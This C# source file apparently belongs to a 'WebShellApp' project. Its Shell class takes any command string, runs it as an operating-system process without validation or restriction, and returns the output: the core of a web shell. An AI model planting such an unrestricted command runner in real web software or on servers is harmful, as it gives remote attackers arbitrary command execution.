using System.Diagnostics;

namespace WebShellApp.BL
{
    public class Shell : IShell
    {
        public string Execute(string command)
        {
            string[] cmd = command.Split(" ");
            Process process = new Process();
            process.StartInfo.FileName = cmd[0];
            process.StartInfo.Arguments = command.Substring(cmd[0].Length);
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }
    }
}
